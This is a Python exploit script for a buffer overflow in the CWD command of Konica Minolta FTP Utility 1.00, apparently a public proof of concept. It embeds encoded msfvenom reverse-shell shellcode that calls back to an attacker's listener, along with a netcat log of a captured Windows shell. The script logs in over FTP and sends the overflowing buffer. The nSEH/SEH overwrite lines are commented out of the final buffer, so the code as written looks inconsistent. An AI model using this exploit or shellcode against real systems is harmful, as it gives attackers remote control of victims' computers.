# Title: Konica Minolta FTP Utility 1.00 Post Auth CWD Command SEH Overflow.
# Date : 01/08/2016
# Author: TOMIWA.
# Software link: http://download.konicaminolta.hk/bt/driver/mfpu/ftpu/ftpu_10.zip
# Software: Konica Minolta FTP Utility v1.0
# Tested: Windows 7 SP1 64bits
# Listen for a reverse netcat connection on port 4444
# root@kali:~# nc -nlvp 4444
# listening on [any] 4444 ...
# connect to [192.168.0.11] from (UNKNOWN) [192.168.0.109] 49158
# Microsoft Windows [Version 6.1.7601]
# Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

# C:\Program Files (x86)\KONICA MINOLTA\FTP Utility>


# !/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B"
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.0.118 LPORT=4444 -e x86/shikata_ga_nai -b "\x00\x0d\x0a\x3d\x5c\x2f" -i 3 -f python
buf = ""
buf += "\xbe\x95\x8c\xbb\x24\xdb\xdb\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x5f\x31\x72\x14\x83\xc2\x04\x03\x72\x10\x77"
buf += "\x79\x62\xe1\xae\xf6\xb1\x1e\xed\x1e\xe6\x8d\x3f\xba"
buf += "\x32\xfb\x8e\x64\x74\x90\xea\x97\x1d\x7c\x89\x73\x1d"
buf += "\x62\x91\x66\xa8\x21\x9a\xb7\xf6\xc8\xce\xd3\x8e\x8f"
buf += "\x12\xa5\xc1\x62\x44\xeb\x33\x84\x55\x7e\xa1\xae\xc1"
buf += "\x73\x50\xb4\xc6\xeb\x8a\x28\x66\x13\x8b\x8b\x42\x6d"
buf += "\x5b\xa6\x63\x02\xbe\x7b\x71\xf0\xcd\x6e\x36\x8c\x69"
buf += "\x3a\x7b\xc8\x03\xc7\xcf\xbe\x12\x0e\xf3\x7a\x29\xa7"
buf += "\xe3\xb3\x54\xd3\x12\xd7\x99\x2c\x7e\x63\x6d\x08\x79"
buf += "\x20\x29\x59\xf2\xfe\xe0\x1f\x9e\x6b\xa6\x36\x5a\x75"
buf += "\x15\xd8\x5d\x8b\x65\xdb\xad\x7c\x84\xe8\x17\xac\x07"
buf += "\xef\x45\x18\x29\x06\xbe\x07\x65\x68\xd5\xf9\xcb\x15"
buf += "\x56\x13\x25\xa3\x72\xd0\xd7\x57\x77\xbb\x8f\x4d\x17"
buf += "\xaf\xf9\x77\x53\x17\xf5\xeb\xab\xe0\x11\x1f\x88\xea"
buf += "\xab\xa9\xce\x0b\x8d\x84\x8f\x76\x05\x05\xdc\x04\x0c"
buf += "\x16\xc9\x84\x06\x6f\x2d\x02\x61\x59\xcd\x36\x17\x88"
buf += "\xe9\x3a\x4f\x63\x9e\x61\x24\xbf\xdc\xd9\x53\x42\x1a"
buf += "\xdf\xb2\x6e\xfe\xec\x8c\xf5\x6d\xeb\x74\x89\x29\x11"
buf += "\x1f\x4d\x9c\xc4\x64\xb9\x8c\x54\xa3\x2c\x3f\xf4\x98"
buf += "\x42\x11\xe0\x06\x32\x57\x75\xac\xaa\xec\x10\xda\x6d"
buf += "\x20\x51\x57\xdd\x99\x1f\x35\x90\x23\xb6\xdb\x37\x17"
buf += "\x1f\x1b\xea\xd1\x37\xc0\x88\x74\x4e\x74\xcf\x63\xb0"
buf += "\x4f\xdc\x2c\x90\xe2\x08\xcd\x49\x40\x36\x1a\xfb\x18"
buf += "\x29\x2b\x6f\x2e\x3c\x57\x6a\x79\xa8\xac\x49\xbe\xe7"
buf += "\x2e\x48\xa0\xeb\x4f\x36\x3b\xa2\x40\xff\x9f\x21\xcd"
buf += "\x8e\xb3\xdf\x92\xed\x3f\x12\x81\x1a\xba\x02\x20\x8f"
buf += "\x1d\x5a\xef\xb1\xc3\xb0\x90\xed\x6a\x21\x5b\xc6\xb9"
buf += "\x24\x3f\xa0\x3f\xc8\x4f\x05\xa3\xcf\x06\xa4\x06\xd5"
buf += "\x8e\xd7\x3e\x11\xc4\x8c\x12\xa7\x3b\x75\x3f\xe8\xd3"
buf += "\xd7\x08\x39\x83\xfa\x80\x71\x3c\x6e\x29\x8d\x5e\xcc"
buf += "\xa1\xd4"
# nSEH = "\xEB\x13\x90\x90"
# SEH = "\x9D\x6D\x20\x12" >> 12206D9D
buffer = "\x41" * 1045 + "\x90" * 30 + buf + "D" * 1955
# buffer = "\x41" * 1060
print "\sending evil buffer...."
s.connect(('192.168.245.135', 21))  # HARDCODED IP ADDRESS.
data = s.recv(1024)
s.send('USER free' + '\r\n')
data = s.recv(1024)
s.send('PASS free' + '\r\n')
data = s.recv(1024)
s.send('CWD ' + buffer + '\r\n')
s.close
